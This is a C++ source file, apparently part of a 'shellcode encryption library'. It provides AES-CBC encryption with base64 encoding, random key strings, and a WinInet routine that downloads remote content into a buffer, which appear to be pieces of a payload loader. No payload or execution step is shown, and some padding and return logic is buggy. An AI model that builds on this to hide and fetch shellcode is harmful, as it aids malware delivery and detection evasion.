// Shellcode加密库.cpp : 定义静态库的函数。
#include "Shellcode加密库.h"
#define BUF_SIZE 4096

using namespace std;

string EncryptionAES(const string& strSrc, const char* g_key, const char* g_iv) {
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//明文
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//进行PKCS7Padding填充。
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//加密后的密文
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//进行进行AES的CBC模式加密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
};

string DecryptionAES(const string& strSrc, const char* g_key, const char* g_iv) {
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "去填充失败！解密出错！！" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz"
			"!@#$%^&*()_+=-[]{};:,.<>/?|";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	string str(length, 0);
	generate_n(str.begin(), length, randchar);
	return str;
}

string toHexString(unsigned char* data, size_t len)
{
	ostringstream oss;
	for (size_t i = 0; i < len; ++i)
		oss << hex << setw(2) << setfill('0') << static_cast<int>(data[i]);
	return oss.str();
}

LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, unsigned char* buff)
{
	HINTERNET hSession;
	LPSTR lpResult = NULL;
	// 这里把 "WinInet" 改成 _T("WinInet")
	hSession = InternetOpen(_T("WinInet"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	__try
	{
		if (hSession != NULL)
		{
			HINTERNET hRequest;
			hRequest = InternetOpenUrlA(hSession, lpcInterNetURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
			__try
			{
				if (hRequest != NULL)
				{
					DWORD dwBytesRead;
					char szBuffer[BUF_SIZE] = { 0 };

					if (InternetReadFile(hRequest, szBuffer, BUF_SIZE, &dwBytesRead))
					{
						RtlMoveMemory(buff, szBuffer, BUF_SIZE);
						return 0;
					}
				}
			}
			__finally
			{
				InternetCloseHandle(hRequest);
			}
		}
	}
	__finally
	{
		InternetCloseHandle(hSession);
	}
	return lpResult;
}